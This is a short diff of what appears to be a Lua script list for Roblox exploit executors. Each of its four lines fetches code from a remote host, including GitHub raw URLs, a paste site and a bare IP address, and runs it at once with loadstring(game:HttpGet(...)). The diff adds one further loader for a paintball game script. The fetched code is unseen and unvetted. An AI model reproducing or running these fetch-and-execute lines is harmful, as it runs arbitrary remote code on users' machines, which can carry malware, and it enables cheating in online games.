@@ -43,3 +43,4 @@ loadstring(game:HttpGet("https://pastefy.app/Q5483MyP/raw"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"))()
 
 loadstring(game:HttpGet("http://195.20.19.91:5000/uchiwa-semi-invisible"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LucasggkX/Games/refs/heads/main/Paintball.lua"))()
